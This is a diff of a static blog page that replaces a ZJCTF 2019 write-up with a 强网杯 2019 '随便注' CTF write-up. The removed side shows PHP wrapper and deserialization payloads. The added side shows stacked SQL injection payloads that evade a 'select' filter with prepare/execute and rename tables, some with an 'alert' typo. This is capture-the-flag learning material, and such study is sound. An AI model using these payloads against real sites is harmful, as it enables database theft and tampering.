@@ -8,13 +8,13 @@
   <meta name="theme-color" content="#fff" id="theme-color">
   <meta name="description" content="Husins">
   <link rel="icon" href="/img/dog.jpg">
-  <title>ZJCTF 2019-NiZhuanSiWei</title>
+  <title>强网杯 2019-随便注</title>
   
   
-  <meta property="og:title" content="ZJCTF 2019-NiZhuanSiWei">
+  <meta property="og:title" content="强网杯 2019-随便注">
   
   
-  <meta property="og:url" content="http://example.com/2021/01/26/ZJCTF-2019-NiZhuanSiWei/index.html">
+  <meta property="og:url" content="http://example.com/2021/01/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
   
   
   <meta property="og:img" content="/img/dog.png">
@@ -179,11 +179,11 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      ZJCTF 2019-NiZhuanSiWei
+      强网杯 2019-随便注
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-01-26T10:13:06.000Z">
+    <time datetime="2021-01-26T10:25:04.000Z">
       <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
       <span>2021-01-26</span>
     </time>
@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>233 字</span>
+    <span>406 字</span>
     
   </div>
   
@@ -211,34 +211,71 @@
   
   </header>
   <div id="section" class="post-content">
-    <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>php伪协议</p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h3-3">https://www.anquanke.com/post/id/202510#h3-3</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cherrygk.cn/2018/07/12/phpagree/">https://www.cherrygk.cn/2018/07/12/phpagree/</a></p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="https://i.loli.net/2021/01/26/nxphgwoQ1lDf3q7.png" alt="image-20201110211356355.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/nxphgwoQ1lDf3q7.png" class="lozad post-image"></p>
-<p>审计代码，需要 <strong>txt</strong>  <strong>file</strong> <strong>password</strong>三个参数，分段绕过</p>
-<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></p>
-<p>这里需要我们对text传参，并让file_get_contents()函数读取内容为 <strong>welcome to the zjctf</strong></p>
-<p>因此使用 <code>?text=data:text/plain,welcome to the zjctf</code>data://伪协议实现绕过。</p>
-<p><img src="https://i.loli.net/2021/01/26/t3WcEiQx7GIRVMH.png" alt="image-20201110215550935.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/t3WcEiQx7GIRVMH.png" class="lozad post-image"></p>
-<p>过滤了 关键字flag</p>
-<p><img src="https://i.loli.net/2021/01/26/QxGWuJmjOTB9HlE.png" alt="image-20201110215616241.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/QxGWuJmjOTB9HlE.png" class="lozad post-image"></p>
-<p>这里提示读取useless.php，因此file=useless.php。但是php文件会被解析不能输出，因此，用base64编码读取</p>
-<p><code>php://filter/read=convert.base64-encode/resource=useless.php</code></p>
-<p><img src="https://i.loli.net/2021/01/26/NMoA9WZH2V7brjE.png" alt="image-20201111151612183.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/NMoA9WZH2V7brjE.png" class="lozad post-image"></p>
-<p>读取到useless.php内容</p>
-<p><img src="https://i.loli.net/2021/01/26/PnZg52TOFE3AmJ4.png" alt="image-20201111152325331.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/PnZg52TOFE3AmJ4.png" class="lozad post-image"></p>
-<p>反手写一个反序列化生成payload：</p>
-<p><code>password=O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;file&quot;;N;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
-<p>最终payload</p>
-<p><code>?text=data:text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
-<p><img src="https://i.loli.net/2021/01/26/2fBGqh4c8ViKJeP.png" alt="image-20201111152953430.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.loli.net/2021/01/26/2fBGqh4c8ViKJeP.png" class="lozad post-image"></p>
+    <p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171803520.png" alt="image-20201117171803520" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171803520.png" class="lozad post-image"></p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171829589.png" alt="image-20201117171829589" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171829589.png" class="lozad post-image"></p>
+<p>输入单引号报错，</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171937597.png" alt="image-20201117171937597" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117171937597.png" class="lozad post-image"></p>
+<p>单引号闭合</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172035363.png" alt="image-20201117172035363" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172035363.png" class="lozad post-image"></p>
+<p>两个字段。</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172147954.png" alt="image-20201117172147954" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172147954.png" class="lozad post-image"></p>
+<p>好家伙，select给我ban了</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172308429.png" alt="image-20201117172308429" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172308429.png" class="lozad post-image"></p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172401235.png" alt="image-20201117172401235" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172401235.png" class="lozad post-image"></p>
+<p>好家伙内联注释也用不了。</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172558492.png" alt="image-20201117172558492" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172558492.png" class="lozad post-image"></p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172655488.png" alt="image-20201117172655488" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172655488.png" class="lozad post-image"></p>
+<p>堆叠注入可以，查到了库名和表名。</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172755458.png" alt="image-20201117172755458" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172755458.png" class="lozad post-image"></p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172818289.png" alt="image-20201117172818289" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117172818289.png" class="lozad post-image"></p>
+<p>分别查询 两个字段里面的信息</p>
+<p><strong>在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</strong></p>
+<p>分析可知</p>
+<ol>
+<li><p>输出点应该是在 id字段</p>
+</li>
+<li><p>flag存在于supersqli数据库中的1919810931114514表的flag字段。</p>
+</li>
+</ol>
+<p>下面就要开始骚姿势了。</p>
+<p>由于正则字段中的数据是查询不出来了的，只有两种方式，</p>
+<ol>
+<li><p>预编译绕过正则</p>
+</li>
+<li><p>将flag所在的表和flag都变成words和id 直接查询输出</p>
+</li>
+</ol>
+<p><strong>预编译</strong></p>
+<pre class="highlight"><code class="hljs sql"><span class="hljs-keyword">set</span> 用于设置变量名和值<br><span class="hljs-keyword">prepare</span> 用于预备一个语句，并赋予名称，以后可以引用该语句<br><span class="hljs-keyword">execute</span> 执行语句<br><span class="hljs-keyword">deallocate</span> <span class="hljs-keyword">prepare</span> 用来释放掉预处理的语句<br></code></pre>
+
+<p>因此构造payload</p>
+<pre class="highlight"><code class="hljs mysql">set  @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);<br>prepare test from @sql;<br>EXECUTe test;<br></code></pre>
+
+<p><code>1&#39;set  @sql=CONCAT(&#39;se&#39;,&#39;lect * from </code>1919810931114514<code>;&#39;);prepare test from @sql;EXECUTe test;#</code></p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117185216255.png" alt="image-20201117185216255" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117185216255.png" class="lozad post-image"></p>
+<p>strstr（）函数可以大小写绕过</p>
+<p>修正payload：</p>
+<pre class="highlight"><code class="hljs mssql">1&#39;;Set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);Prepare test from @sql;EXECUTe test;#<br></code></pre>
+
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117190147326.png" alt="image-20201117190147326" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117190147326.png" class="lozad post-image"></p>
+<p>得到flag</p>
+<p><strong>修改表名</strong></p>
+<pre class="highlight"><code class="hljs text">修改表名(将表名user改为users)<br>alter table user rename to users;<br><br>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);<br></code></pre>
+
+<p>因此构造payload：</p>
+<pre class="highlight"><code class="hljs mysql">alert table words rename to 123;<br>alert table &#96;1919810931114514&#96; rename to words;<br>alert table words change flag id int(40);<br></code></pre>
+
+<pre class="highlight"><code class="hljs mysql">1&#39;;alert table words rename to     123;alert table &#96;1919810931114514&#96; rename to words;alert table words change flag id varchar(50);#<br></code></pre>
+
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117190147326.png" alt="image-20201117190147326" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201117190147326.png" class="lozad post-image"></p>
+<p>使用1‘ or 1=1 # 得到flag。</p>
 
   </div>
   <div>
   
   <div class="post-note note-warning copyright" style="margin-top: 42px">
     <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/about">Husins</a></p>
-    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2021/01/26/ZJCTF-2019-NiZhuanSiWei/">http://example.com/2021/01/26/ZJCTF-2019-NiZhuanSiWei/</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="http://example.com/2021/01/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">http://example.com/2021/01/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</a></p>
     <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
   </div>
   
@@ -246,25 +283,13 @@
 </article>
 <div class="nav">
   
-  <div class="nav-item-prev">
-    <a href="/2021/01/26/网鼎杯-2018-Fakebook/" class="nav-link">
-      <i class="iconfont icon-left nav-prev-icon"></i>
-      <div>
-        <div class="nav-label">上一篇</div>
-        
-        <div class="nav-title">网鼎杯 2018-Fakebook </div>
-        
-      </div>
-    </a>
-  </div>
-  
   
   <div class="nav-item-next">
-    <a href="/2021/01/26/BJDCTF2020-EasyMD5/" class="nav-link">
+    <a href="/2021/01/26/网鼎杯-2018-Fakebook/" class="nav-link">
       <div>
         <div class="nav-label">下一篇</div>
         
-        <div class="nav-title">BJDCTF2020 EasyMD5 </div>
+        <div class="nav-title">网鼎杯 2018-Fakebook </div>
         
       </div>
       <i class="iconfont icon-right nav-next-icon"></i>
@@ -275,7 +300,7 @@
 
 <div class="card card-content toc-card" id="mobiletoc">
   <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol>
+
 </div></main>
           <aside class="left-column">
             
@@ -308,7 +333,7 @@
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
       <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol>
+
     </div>
   </article>
   
@@ -364,7 +389,7 @@
   
   <article class="card card-content toc-card">
     <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol>
+
   </article>
   
   
